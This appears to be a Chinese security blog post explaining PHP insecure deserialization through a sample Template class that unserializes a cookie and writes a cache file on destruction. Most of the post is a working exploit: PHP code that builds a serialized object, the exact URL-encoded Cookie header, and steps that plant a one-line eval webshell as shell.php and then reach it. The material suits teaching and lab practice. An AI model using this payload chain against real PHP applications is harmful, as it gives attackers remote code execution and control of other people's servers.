---
# 当前页面内容标题
title: PHP 反序列化
# sidebar: heading
# 当前页面图标
icon: note
# 分类
category:
    - web安全
tag: 
    - 反序列化
    - PHP魔术方法
sticky: false
# 是否收藏在博客主题的文章列表中，当填入数字时，数字越大，排名越靠前。
star: false
# 是否将该文章添加至文章列表中
article: true
# 是否将该文章添加至时间线中
timeline: true
# sidebar: heading
order: 2
date: 2023-02-20
# 浏览量
pageview: true
---

```php
class Template {
    var $cacheFile = "cache.txt";
    var $template = "<div>Welcome back %s</div>";

    function __construct($data = null) {
        $data = $this->loadData($data);    // $data反序列后是一个Template对象
        $this->render($data);
    }

    function loadData($data) {
        return unserialize($data);   // $data值必须是一个序列化结果
        return [];                   // []代表空数组，但是此处不会执行
    }

    function createCache($file = null, $tpl = null) {
        $file = $file ?: $this->cacheFile;
        $tpl = $tpl ?: $this->template;
        file_put_contents($file, $tpl);
    }

    function render($data) {
        echo sprintf($this->template, htmlspecialchars($data['name']));  // 此处$data只能是一个数组
    }

    // 此会会被调用两次，第一次实例化后正常调用，第二次反序列后再调用 
    function __destruct() {
        $this->createCache();
    }
}
new Template($_COOKIE['data']);
```

分析代码：

1. `Template`里两个魔法方法，分别是`construct`和`destruct`
2. `construct`里会对数据进行反序列化，同时将结果传到`render`进行打印
3. `render`的参数必须是数组，如果反序列化返回的结果不是数组，就会产生调用报错
4. 最后`destruct`被执行，调用`createCache`创建文件

思路：

1. 创建POC设置`$template`为一句话木马，`$cacheFile`为自定义的文件名称
2. 因为`unserialize`需要返回一个数组，所以将对象插入到数组中，再进行序列化
3. 开启代理，将序列化结果设置到`cookie`里面
4. 访问`shell.php`

实操：

1. 创建POC

   ```php
   <?php
   class Template
   {
       var $name = "s";
       var $cacheFile = "shell.php";
       var $template = '<?php @eval($_POST["shell"]);?>';
   }
   $t = new Template();
   $array = array('name' => $t);
   print(base64_encode(serialize($array)));
   # 得到：
   a:1:{s:4:"name";O:8:"Template":3:{s:4:"name";s:1:"s";s:9:"cacheFile";s:9:"shell.php";s:8:"template";s:31:"<?php @eval($_POST["shell"]);?>";}}
   ```

2. 开启代理，修改cookie，这里的`;`需要进行url转换

   ```
   Cookie: data=a:1:{s:4:"name"%3bO:8:"Template":3:{s:4:"name"%3bs:1:"s"%3bs:9:"cacheFile"%3bs:9:"shell.php"%3bs:8:"template"%3bs:31:"<?php @eval($_POST["shell"])%3b?>"%3b}}
   ```

   ![image-20221013222739955](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221013222739955.png)

3. 访问`shell.php`

   ![image-20221013222946449](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221013222946449.png)

4. 查看服务器文件

   ![image-20221013223011953](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20221013223011953.png)